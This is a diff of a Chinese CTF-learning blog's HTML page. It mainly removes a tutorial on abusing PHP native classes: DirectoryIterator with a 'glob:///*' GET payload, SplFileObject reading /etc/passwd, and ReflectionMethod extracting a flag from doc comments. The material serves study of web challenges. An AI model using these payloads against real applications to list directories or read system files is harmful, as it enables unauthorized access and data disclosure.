-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir = $_GET[&#x27;whoami&#x27;];</span><br><span class="line">$a = new DirectoryIterator($dir);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);// 不加__toString()也可,因为echo可以自动调用</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?whoami=glob:///*</span><br></pre></td></tr></table></figure>
-
-<p>同样由于GlobIterator类的特殊性，使用该类遍历时就不需要配合glob协议了。</p>
-<h1 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h1><p>能遍历自然要读取，SplFileInfo类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作。nisa的题目中进行文件读取操作用的就是这个类。</p>
-<p>读取第一行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$context = new SplFileObject(&#x27;/etc/passwd&#x27;);</span><br><span class="line">echo $context;</span><br></pre></td></tr></table></figure>
-
-<p>遍历文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$context = new SplFileObject(&#x27;/etc/passwd&#x27;);</span><br><span class="line">foreach($context as $f)&#123;</span><br><span class="line">    echo($f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>和遍历文件的类用法相似，也是比较简单的。</p>
-<h1 id="ReflectionMethod"><a href="#ReflectionMethod" class="headerlink" title="ReflectionMethod"></a>ReflectionMethod</h1><p>这个类报告了一个方法的有关信息，最重要的是可以导出或提取关于类、方法、属性、参数等的详细信息，包括注释：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ReflectionMethod::__construct — ReflectionMethod 的构造函数</span><br><span class="line">    ReflectionMethod::export — 输出一个回调方法</span><br><span class="line">    ReflectionMethod::getClosure — 返回一个动态建立的方法调用接口，译者注：可以使用这个返回值直接调用非公开方法。</span><br><span class="line">    ReflectionMethod::getDeclaringClass — 获取被反射的方法所在类的反射实例</span><br><span class="line">    ReflectionMethod::getModifiers — 获取方法的修饰符</span><br><span class="line">    ReflectionMethod::getPrototype — 返回方法原型 (如果存在)</span><br><span class="line">    ReflectionMethod::invoke — Invoke</span><br><span class="line">    ReflectionMethod::invokeArgs — 带参数执行</span><br><span class="line">    ReflectionMethod::isAbstract — 判断方法是否是抽象方法</span><br><span class="line">    ReflectionMethod::isConstructor — 判断方法是否是构造方法</span><br><span class="line">    ReflectionMethod::isDestructor — 判断方法是否是析构方法</span><br><span class="line">    ReflectionMethod::isFinal — 判断方法是否定义 final</span><br><span class="line">    ReflectionMethod::isPrivate — 判断方法是否是私有方法</span><br><span class="line">    ReflectionMethod::isProtected — 判断方法是否是保护方法 (protected)</span><br><span class="line">    ReflectionMethod::isPublic — 判断方法是否是公开方法</span><br><span class="line">    ReflectionMethod::isStatic — 判断方法是否是静态方法</span><br><span class="line">    ReflectionMethod::setAccessible — 设置方法是否访问</span><br><span class="line">    ReflectionMethod::__toString — 返回反射方法对象的字符串表达</span><br></pre></td></tr></table></figure>
-
-<p>我们用<code>getDocComment()</code>方法举例，获取注释内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Flag</span><br><span class="line">&#123;</span><br><span class="line">    /**</span><br><span class="line">     * mrl64&#123;flag_is_here&#125;</span><br><span class="line">    */</span><br><span class="line">    function read()&#123;</span><br><span class="line">        return 1234;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new ReflectionMethod(&#x27;Flag&#x27;,&#x27;read&#x27;);</span><br><span class="line">var_dump($a-&gt;getDocComment());</span><br></pre></td></tr></table></figure>
-
-<p>发现回显：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string(39) &quot;/**</span><br><span class="line">     * mrl64&#123;flag_is_here&#125;</span><br><span class="line">    */&quot;</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本来是只想着学下文件操作类的部分，没想到已经出现了这么多不同的考法，还是得多做总结，利用在之后的题目中。</p>
-
-          
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>填坑这一块知识了，填完坑就要开始恶补pop和xss这两块的知识来为iscc做准备了。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2022/04/04/php%E8%BF%AD%E4%BB%A3%E5%99%A8%EF%BC%88%E5%8E%9F%E7%94%9F%E7%B1%BB%EF%BC%89%E7%9A%84%E5%88%A9%E7%94%A8/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1676,154 +1726,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/11/buu%E7%BB%83%E4%B9%A06/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="mrl64's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2022/03/11/buu%E7%BB%83%E4%B9%A06/" itemprop="url">buu练习6</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-11T15:53:06+08:00">
-                2022-03-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>还是凑字数用的，前言总要有点字在，才不显得空荡荡的。</p>
-</blockquote>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2022/03/11/buu%E7%BB%83%E4%B9%A06/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1874,7 +1776,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">61</span>
+                  <span class="site-state-item-count">62</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
